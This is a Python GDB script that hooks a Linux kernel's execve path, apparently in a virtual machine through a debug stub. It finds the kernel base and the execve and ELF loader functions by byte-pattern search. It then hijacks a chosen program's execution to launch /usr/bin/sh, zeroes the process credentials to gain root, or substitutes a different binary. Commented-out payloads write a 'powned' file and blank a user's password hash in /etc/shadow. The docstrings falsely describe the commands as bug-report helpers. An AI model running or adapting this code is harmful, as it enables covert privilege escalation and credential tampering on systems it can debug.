import struct

kernel_base = None
address_load_elf_binary = None
address_execveatcommon = None
vmlinux_loaded = False
inferior=gdb.inferiors()[0]

class getKernelBase (gdb.Command):
  """Collect required info for a bug report"""

  def __init__(self):
    super(getKernelBase, self).__init__("getKernelBase", gdb.COMMAND_USER)

  def invoke(self, arg, from_tty):
      print(hex(f_getKernelBase()))

class getBase (gdb.Command):
  """Collect required info for a bug report"""

  def __init__(self):
    super(getBase, self).__init__("getBase", gdb.COMMAND_USER)

  def invoke(self, arg, from_tty):
      print(hex(f_getBase(arg)))

class getListProcess(gdb.Command):

    def __init__(self):
        super(getListProcess, self).__init__("getListProcess", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        f_getListProcess(arg)


class printNextProcess (gdb.Command):
  """Collect required info for a bug report"""

  def __init__(self):
    super(printNextProcess, self).__init__("printNextProcess", gdb.COMMAND_USER)

  def invoke(self, arg, from_tty):
      print(f_printNextProcess())

class replaceProcess (gdb.Command):
  """Collect required info for a bug report"""

  def __init__(self):
    super(replaceProcess, self).__init__("replaceProcess", gdb.COMMAND_USER)

  def invoke(self, arg, from_tty):
     f_replaceProcess(arg)

class replaceNameProcess (gdb.Command):
  """Collect required info for a bug report"""

  def __init__(self):
    super(replaceNameProcess, self).__init__("replaceNameProcess", gdb.COMMAND_USER)

  def invoke(self, arg, from_tty):
     f_replaceNameProcess(arg)

def load_vmlinux():
    global vmlinux_loaded
    if vmlinux_loaded == False:
        gdb.execute('file vmlinux')
        vmlinux_loaded = True

def get_address_execveatcommon_v5_10():
    return _get_address_execveatcommon(0x394, 0x184)

def get_address_execveatcommon_v5_16():
    return _get_address_execveatcommon(0x2f6, 0x156)

# for version 5.10
def _get_address_execveatcommon(o_bprm_execve, o_exeveatcommon):
    global address_execveatcommon
    if address_execveatcommon == None:
        kernel_base = f_getKernelBase()

        #addresses = gdb.execute(f'find {kernel_base}, 0xffffffffffffffff, "binfmt-%04x"', False, True)
        #addresses = addresses.split()[0]
        #a1 = addresses[-2:]
        #a2 = addresses[-4:-2]
        #a3 = addresses[-6:-4]
        #a4 = addresses[-8:-6]
        #print(addresses, a1, a2, a3, a4)
        #addresses = gdb.execute(f'find {kernel_base}, 0xffffffffffffffff, (char)0x48, (char)0xc7,  (char)0xc6, (char)0x{a1}, (char)0x{a2}, (char)0x{a3}, (char)0x{a4}', False, True)

        addresses = inferior.search_memory(kernel_base,
                0xffffffffffffffff-kernel_base,
                b'\x41\x0f\xb7\x95\xa2\x00\x00\x00\x48\xc7\xc6')
        addresses += 8

        #addresses = int((addresses.split()[0:2])[0], 16)

        address_bprm_execve = addresses - o_bprm_execve
        gdb.execute(f"b *{address_bprm_execve}")
        gdb.execute("c")
        gdb.execute("del")
        address_execveatcommon = int(gdb.execute("x/a $rsp", False, True).split()[-1], 16) - o_exeveatcommon
    return address_execveatcommon

def get_address_execveatcommon():
    return get_address_execveatcommon_v5_16()

# for version 5.10 and 5.16
def get_address_load_elf_binary():
    global address_load_elf_binary
    if address_load_elf_binary == None:
        kernel_base = f_getKernelBase()

        #addresses = gdb.execute(f'find {kernel_base}, 0xffffffffffffffff, (char)0x81, (char)0xbf, (char)0xa0, (short)0x0000, (char) 0x0, (char)0x7F, (char)0x45, (char)0x4c, (char)0x46', False, True)
        #addresses = int((addresses.split()[0:2])[0], 16)

        addresses = inferior.search_memory(kernel_base, 0xffffffffffffffff-kernel_base, b"\x81\xbf\xa0\x00\x00\x00\x7F\x45\x4c\x46")
        address_load_elf_binary = addresses - 0x2c
    return address_load_elf_binary



def f_replaceNameProcess(processName="/usr/bin/ls"):
    address_execveatcommon = get_address_execveatcommon()
    gdb.execute(f"b *{address_execveatcommon}")
    # only for debug
    # load_vmlinux()
    while True:
        gdb.execute('c', False, True)
        # only for debug
        # filename = gdb.execute('p ((struct filename*)$rsi)->name', False, True).split()[3]
        # print filename
        filename = gdb.execute('p *(char **)$rsi', False, True).split()[3]
        print(filename[1:-1], processName)
        if filename[1:-1] == processName:
            break

    rsi = gdb.parse_and_eval("$rsi")
    kernel_name_add = struct.unpack('<Q', bytes(inferior.read_memory(rsi, 0x8)))[0]
    user_name_add = struct.unpack('<Q', bytes(inferior.read_memory(rsi+0x8, 0x8)))[0]
    new_process = "/usr/bin/sh"
    print(kernel_name_add, new_process, len(new_process) + 1 )
    inferior.write_memory(kernel_name_add, new_process, len(new_process) + 1)
    
    #for i in range(len(new_process)):
    #    gdb.execute(f"p *((char*)({kernel_name_add}+{i})) = '{new_process[i]}'")
    #    gdb.execute(f"p *((char*)({user_name_add}+{i})) = '{new_process[i]}'")
    #gdb.execute(f"p *((char*)({kernel_name_add}+{len(new_process)})) = 0x0")
    #gdb.execute(f"p *((char*)({user_name_add}+{len(new_process)})) = 0x0")

    # remove argument user
    # gdb.execute("p (((struct user_arg_ptr*)$rcx)->ptr->compat) = 0x0")
    user_arg_ptr = gdb.parse_and_eval("$rcx") + 0x8
    gdb.execute(f"p *(char **){user_arg_ptr} = 0x0")

    # gdb.execute("p *((struct filename*)$rsi)")
    # print filename after change
    gdb.execute('p *(char **)$rsi')
    gdb.execute("del")
    
    address_load_elf_binary = get_address_load_elf_binary()
    gdb.execute(f"b *({address_load_elf_binary})")
    gdb.execute("c")
    #gdb.execute('p *((struct linux_binprm*) $rdi)')
    #print('p *((struct linux_binprm*) $rdi)')

    cred_address = gdb.parse_and_eval("$rdi") + 0x48

    base_uid = struct.unpack('<Q', bytes(inferior.read_memory(cred_address, 0x8)))[0]
    inferior.write_memory(base_uid + 0x4, bytes([0]*0x20), 0x20)

    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->uid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->gid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->suid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->sgid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->euid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->egid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->fsuid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->fsgid.val = 0")


    gdb.execute("del")
    gdb.execute("c")

    #print("p ((struct filename*)$rsi)->name")
    #print("p (char*)(((struct user_arg_ptr*)$rdx)->ptr->compat)")
    #print("p (char*)(((struct user_arg_ptr*)$rcx)->ptr->compat)")

def f_replaceNameProcess(processName="/usr/bin/ls"):
    address_execveatcommon = get_address_execveatcommon()
    gdb.execute(f"b *{address_execveatcommon}")
    # only for debug
    # load_vmlinux()
    while True:
        gdb.execute('c', False, True)
        # only for debug
        # filename = gdb.execute('p ((struct filename*)$rsi)->name', False, True).split()[3]
        # print filename
        filename = gdb.execute('p *(char **)$rsi', False, True).split()[3]
        print(filename[1:-1], processName)
        if filename[1:-1] == processName:
            break

    rsi = gdb.parse_and_eval("$rsi")
    kernel_name_add = struct.unpack('<Q', bytes(inferior.read_memory(rsi, 0x8)))[0]
    user_name_add = struct.unpack('<Q', bytes(inferior.read_memory(rsi+0x8, 0x8)))[0]
    #new_process = "/usr/sbin/agetty"
    new_process = "/usr/bin/sh"
    print(kernel_name_add, new_process, len(new_process) + 1 )
    inferior.write_memory(kernel_name_add, new_process, len(new_process) + 1)
    
    base_mem = gdb.parse_and_eval("$rcx")
    backup = inferior.read_memory(base_mem, 0x1000)
    args = [new_process]
    #args = [new_process, "-a", "root", "ttyS0"]
    #args = [new_process, "-c", "echo 'test' > /home/user/powned"]
    #args = [new_process, "-c", "cat /etc/shadow | sed -E 's/(user:).*(:.*:.*:.*:.*:.*:.*:$)/\\1\\2/g' > /tmp/shadow; mv /tmp/shadow /etc/shadow"]
    size_args = 8 * len(args)
    offset = base_mem + size_args
    offset_addr = base_mem
    inferior.write_memory(offset, b"\x00"*8, 8)
    print("last arg: " + hex(offset))
    offset += 8
    for arg in args:
        inferior.write_memory(offset_addr, struct.pack('<Q', offset), 8)
        offset_addr += 8
        inferior.write_memory(offset, arg, len(arg) + 1)
        offset += len(arg) + 1
        print("adress_arg : " + hex(offset_addr-8) + ", arg : " + hex(offset))


        

    return
    
    #for i in range(len(new_process)):
    #    gdb.execute(f"p *((char*)({kernel_name_add}+{i})) = '{new_process[i]}'")
    #    gdb.execute(f"p *((char*)({user_name_add}+{i})) = '{new_process[i]}'")
    #gdb.execute(f"p *((char*)({kernel_name_add}+{len(new_process)})) = 0x0")
    #gdb.execute(f"p *((char*)({user_name_add}+{len(new_process)})) = 0x0")

    # remove argument user
    # gdb.execute("p (((struct user_arg_ptr*)$rcx)->ptr->compat) = 0x0")
    user_arg_ptr = gdb.parse_and_eval("$rcx") + 0x8
    gdb.execute(f"p *(char **){user_arg_ptr} = 0x0")

    # gdb.execute("p *((struct filename*)$rsi)")
    # print filename after change
    gdb.execute('p *(char **)$rsi')
    gdb.execute("del")
    
    address_load_elf_binary = get_address_load_elf_binary()
    gdb.execute(f"b *({address_load_elf_binary})")
    gdb.execute("c")
    #gdb.execute('p *((struct linux_binprm*) $rdi)')
    #print('p *((struct linux_binprm*) $rdi)')

    cred_address = gdb.parse_and_eval("$rdi") + 0x48

    base_uid = struct.unpack('<Q', bytes(inferior.read_memory(cred_address, 0x8)))[0]
    inferior.write_memory(base_uid + 0x4, bytes([0]*0x20), 0x20)

    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->uid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->gid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->suid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->sgid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->euid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->egid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->fsuid.val = 0")
    #gdb.execute("p ((struct linux_binprm*) $rdi)->cred->fsgid.val = 0")


    gdb.execute("del")
    gdb.execute("c")

    #print("p ((struct filename*)$rsi)->name")
    #print("p (char*)(((struct user_arg_ptr*)$rdx)->ptr->compat)")
    #print("p (char*)(((struct user_arg_ptr*)$rcx)->ptr->compat)")



def f_replaceProcess(processName="/usr/bin/ls"):
    address_load_elf_binary = get_address_load_elf_binary()
    gdb.execute(f"b *({address_load_elf_binary})")
    load_vmlinux()
    
    while True:
        gdb.execute('c', False, True)
        filename=gdb.execute('p ((struct linux_binprm*) $rdi)->filename', False, True).split()[3]
        print(filename, processName)
        if filename[1:-1] == processName:
            break

    binary = "hello"
    size = 0
    with open(binary, "rb") as f:
        size = len(f.read())


    buf_address = gdb.parse_and_eval("$rdi") + 0xa0
    gdb.execute(f"monitor memsave {buf_address} {size} backup.bin")
    gdb.execute(f"restore hello binary {buf_address}")
    #gdb.execute("si")
    #gdb.execute('p *((struct linux_binprm*) $rdi)')
    gdb.execute("del")
    gdb.execute(f"b *({address_load_elf_binary-0x1da})")
    gdb.execute("c")
    gdb.execute(f"restore ~/backup.bin binary {buf_address}")
    



def f_printNextProcess():
    address_load_elf_binary = get_address_load_elf_binary()

    print(f"address of load_elf_binary {address_load_elf_binary}")
    gdb.execute(f"b *({address_load_elf_binary})")
    #load_vmlinux()

    gdb.execute('c', False, True)
    #ret=gdb.execute('p *((struct linux_binprm*) $rdi)', False, True)
    #print(ret)
    #ret=gdb.execute('p ((struct linux_binprm*) $rdi)->filename', False, True)
    filename = gdb.execute('p *(char**)($rdi+0x60)', False, True).split()[3]

    gdb.execute("del")
    return filename

def f_getListProcess(arg):
    with open(arg, "w+") as f:
        while True:
            filename = f_printNextProcess()
            print(filename)
            f.write(filename + "\n")
            f.flush()



def f_getKernelBase():
    global kernel_base
    if not kernel_base:
        tmp_base = 0xffffffff00000000
        index = 6
        while True:
          try:
            gdb.execute(f"x/i {tmp_base}", False, True)
          except gdb.MemoryError:
              tmp_base += 1 << 4*index
              continue
          if index > 1:
            tmp_base -= 1 << 4*index
            index -= 1
            continue
          break;
        return tmp_base

def f_getBase(tmp_base):
    address_load_elf_binary = get_address_load_elf_binary()
    print(hex(address_load_elf_binary))
    kernel_base = f_getKernelBase()
    ret = inferior.search_memory(kernel_base,
            0xffffffffffffffff-kernel_base,
            b'\x41\x0f\xb7\x95\xa2\x00\x00\x00\x48\xc7\xc6')
    print(hex(ret))
    return address_load_elf_binary


    #tmp_base = int(tmp_base, 16)
    #while True:
    #  try:
    #    gdb.execute(f"x/i {tmp_base}", False, True)
    #  except gdb.MemoryError:
    #      tmp_base += 1000
    #      print(tmp_base)
    #      continue
    #  break;
    #return tmp_base


#def identify_zone():
#    tmp_base = 0x0000000000000000
#    index = 6
#        while True:
#          try:
#            gdb.execute(f"x/i {tmp_base}", False, True)
#          except gdb.MemoryError:
#              tmp_base += 1 << 4*index
#              continue
#          if index > 1:
#            tmp_base -= 1 << 4*index
#            index -= 1
#            continue
#          break;
#        return tmp_base







getKernelBase()
getBase()
printNextProcess()
replaceProcess()
replaceNameProcess()
getListProcess()
